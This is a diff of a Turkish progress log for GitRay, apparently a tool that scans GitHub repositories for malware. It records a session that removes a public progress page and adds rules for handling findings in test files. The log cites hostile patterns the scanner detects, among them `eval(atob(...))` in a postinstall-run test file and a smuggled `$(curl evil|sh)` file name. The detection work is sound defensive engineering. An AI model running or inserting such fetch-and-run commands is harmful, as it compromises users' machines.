@@ -1,6 +1,6 @@
 # GitRay ilerleme günlüğü
 
-Son güncelleme: **9 Ekim 2026**. Kurallar ve mimari için `CLAUDE.md`, ne yapıldığı ve ne kaldığı için bu dosya. Sitedeki `/progress` sayfası bu dosyayı gösterir.
+Son güncelleme: **9 Ekim 2026**. Kurallar ve mimari için `CLAUDE.md`, ne yapıldığı ve ne kaldığı için bu dosya. Bu dosya kullanıcının kendi takip dosyasıdır; sitede gösterilmez (8. oturumda `/progress` sayfası kaldırıldı). Not: GitHub reposu public olduğu için dosya GitHub'da görünür.
 
 ## Şu anki durum
 
@@ -16,8 +16,8 @@ Son güncelleme: **9 Ekim 2026**. Kurallar ve mimari için `CLAUDE.md`, ne yapı
 | CLI: `npm run scan -- owner/repo` | Hazır |
 | Safe Zone ve Scammer sayfaları, kalıcı depolama (Neon Postgres) | Kod hazır; veritabanını kullanıcı Vercel'den bağlayacak |
 | Zararlı bağımlılık kontrolü (OSV) | Hazır (6. oturum); rapordaki satır 7. oturumda her duruma görünür yapıldı, canlıda doğrulanmalı |
-| Yanlış alarm kalibrasyonu | 1. tur yapıldı (7. oturum): 38 popüler temiz repodan 28'i Temiz (önce 15) |
-| Testler | 20 dosya, 727 test |
+| Yanlış alarm kalibrasyonu | 1. tur yapıldı (7. oturum): 38 popüler temiz repodan 28'i Temiz (önce 15); 8. oturumdaki test dosyası kararından sonra Tehlikeli 3 |
+| Testler | 20 dosya, 732 test |
 | Vercel'e deploy | Kod `main`'de; token ve veritabanını kullanıcı ekleyecek (adımlar aşağıda) |
 | VirusTotal API | Yok (API anahtarı gerekiyor, kullanıcıya sorulacak) |
 
@@ -345,7 +345,7 @@ Son güncelleme: **9 Ekim 2026**. Kurallar ve mimari için `CLAUDE.md`, ne yapı
 - **Commit'lenmiş programlar:** pip (Windows başlatıcıları), uv (trampolinler), terminal (nuget.exe, WinAppDriver), notepad++ (test DLL'leri), cli/cli (test zip'indeki gh.exe).
 - **VS Code gerçekten bu kodları içeriyor:** Copilot'un `curl | bash` ile kurulum yapan kodu, `folderOpen` görevi, gizli PowerShell çalıştıran kurulum scripti, SSH anahtarı okuyan uzak bağlantı kodu.
 
-**Kullanıcıya sorulacak iki karar** (CLAUDE.md'deki kararlarla ilgili olduğu için sormadan uygulanmadı):
+**Kullanıcıya sorulan iki karar** (8. oturumda kullanıcı "ne öneriyorsan" dedi; uygulananlar 8. oturumda):
 1. **Test dosyaları.**
    - Bulgular `test/`, `tests/`, `spec/`, `__tests__/`, `fixtures/` altındaysa raporda ayrı bir "test dosyalarında" grubunda gösterilebilir.
    - Puanı düşürmek ise CLAUDE.md'deki "klasöre göre puan düşürülmez" kararıyla çelişir: saldırgan payload'ı `tests/` içine saklayabilir.
@@ -354,9 +354,30 @@ Son güncelleme: **9 Ekim 2026**. Kurallar ve mimari için `CLAUDE.md`, ne yapı
    - Çok yıldızlı, yıllardır aktif ve köklü bir hesaba ait repolarda karar en fazla Şüpheli olabilir. Bunun istisnası GR-DEP-001 gibi kesin göstergeler.
    - Riski: yıldızlar satın alınabiliyor, eski hesaplar ele geçirilebiliyor. Ele geçirilmiş popüler bir repoya eklenen zararlı kod "Tehlikeli" yerine "Şüpheli" görünür.
 
+### 9 Ekim 2026 (8. oturum): Progress sayfası kaldırıldı, test dosyası kararı
+
+**İstek:** "Ne öneriyorsan ona devam et; sitedeki progress kısmını sil, o bana özel."
+
+**Progress sayfası:**
+- `/progress` sayfası, menüdeki linki, ona ait CSS ve yalnızca onun kullandığı `react-markdown`/`remark-gfm` paketleri silindi. README'deki `PROGRESS.md` linki de kaldırıldı.
+- `PROGRESS.md` repoda duruyor; Claude oturumları onu okuyarak başlıyor.
+- Dikkat: GitHub reposu public, bu yüzden dosya GitHub'da hâlâ okunabilir. Tamamen gizlemek için repo private yapılabilir (Vercel private repolarla da çalışır) ya da dosya repodan çıkarılabilir (o zaman oturumlar ilerlemeyi göremez).
+
+**Test dosyası kararı** (7. oturumdaki 1. soru; kullanıcı önerileni seçti):
+- Test kodu ve test verisindeki bulgular (`tests/`, `spec/`, `fixtures/`, `*.test.ts`, `test_*.py`...) raporda "in a test file" etiketiyle gösteriliyor ve puana tam ağırlıkla giriyor.
+- Yalnızca bunlar yüzünden Tehlikeli olacak bir repo Şüpheli'de (69) tutuluyor ve raporda nedeni yazıyor. Şartlar:
+  - test dışı bulguların toplamı 70'in altında,
+  - test dışında kendiliğinden çalışan hiçbir şey (`postinstall`, `folderOpen`, build olayı...) yok.
+- Kendiliğinden çalışan bir şey varsa sınır uygulanmıyor: `postinstall: node tests/setup.js` + `tests/setup.js` içinde `eval(atob(...))` Tehlikeli kalıyor (`tests/calibration.test.ts`).
+- Etkisi: anthropics/claude-code 70 → 69 ve PowerShell 95 → 69, ikisi de Şüpheli. electron, rustup ve vscode Tehlikeli kalıyor; onların puanı test dışındaki koddan geliyor. Kalibrasyon: 28 Temiz, 7 Şüpheli, 3 Tehlikeli.
+
+**Repo itibarı kararı** (2. soru): uygulanmadı. Yıldız ve yaş puanı düşürmüyor, raporda yalnızca bilgi olarak duruyor. Sebep: yıldızlar satın alınabiliyor, ele geçirilmiş popüler repolar gerçek bir tehdit.
+
+`ENGINE_VERSION` 0.4.0 oldu; kayıtlı raporlar yeniden taranacak.
+
 ## Sıradaki adımlar (öncelik sırasıyla)
 
-1. **Kullanıcının kararı:** yukarıdaki iki soru (test dosyaları, repo itibarı). Sonra kalibrasyonun 2. turu.
+1. **Kalibrasyonun 2. turu:** daha fazla repo (Go, Java, PHP, mobil), özellikle commit'lenmiş programlar (`GR-BIN-001`) için bir ayar.
 2. **Canlıda doğrulama:** Vercel'de bir repo taranınca raporda "Malicious dependencies (OSV)" satırı görünmeli. Yeni motor sürümüyle (0.3.0) Scammer listesindeki eski kayıtlar yeniden taranınca çoğu listeden çıkmalı.
 3. **Liste kalitesi.** Scammer listesi herkese açık; kalan yanlış alarmlar orada görünür. Test dosyası ve itibar kararından sonra gerekirse listeye girme eşiği yükseltilebilir.
 4. **Kötüye kullanıma karşı koruma:** Cloudflare Turnstile, veritabanında kalıcı hız sınırı.
@@ -372,7 +393,7 @@ Son güncelleme: **9 Ekim 2026**. Kurallar ve mimari için `CLAUDE.md`, ne yapı
 - `GR-AUTO-002`: `exec(open('pkg/version.py').read())` ile sürüm okuyan meşru `setup.py` dosyaları `GR-CODE-008` altında 10 puan alır (tek başına Temiz).
 - `GR-AUTO-005`: Önceden derlenmiş kütüphane indiren meşru `-sys` crate'leri (`build.rs` içinde ağ kullanımı) 35 puanla Şüpheli çıkabilir. Kalibrasyondaki Rust repoları (uv, ripgrep, rustup) yalnızca `git` çalıştırıyor ve 5 puan aldı.
 - `GR-OBF-001`: Bilinen biçimler (görsel, font, sertifika, JSON...) artık çözülüp eleniyor. Yine de rastgele test vektörleri, emscripten bellek verisi ve Yarn'ın `.yarn/releases/*.cjs` dosyasındaki sıkıştırılmış kod 15 puan alır. Yarn dosyası özellikle tartışmalı: `yarn` komutu bu dosyayı çalıştırdığı için gerçekten bir saldırı yolu olabilir.
-- Kod kalıbı kuralları bir dizgenin test verisi mi yoksa çalışan kod mu olduğunu bilemez (`'$(curl evil|sh).txt'` gibi test adları). Klasöre göre puan düşürülmüyor (bkz. 7. oturumdaki karar soruları).
+- Kod kalıbı kuralları bir dizgenin test verisi mi yoksa çalışan kod mu olduğunu bilemez (`'$(curl evil|sh).txt'` gibi test adları). Bu yüzden test klasörlerindeki bulgular etiketleniyor ve tek başlarına Tehlikeli yapamıyor (8. oturum); puan düşürülmüyor.
 - README'deki kurulum satırları (`curl | sh`) puan almaz; aynı satırın PowerShell hali (`irm ...ps1 | iex`) `.ps1` linki olduğu için `GR-LINK-001` ile 20 alır. Bu bilerek bırakıldı: "antivirüsü kapat, şunu çalıştır" tuzaklarının sinyali.
 - `GR-LINK-001`: Kendi web sitesinden `.exe`/`.dmg` dağıtan meşru projeler 20 puan alır (tek başına Temiz).
 - Şifreli RAR yalnızca başlıkları da şifreliyse (`rar -hp`) tespit edilir; 7z şifrelemesi tespit edilmiyor.
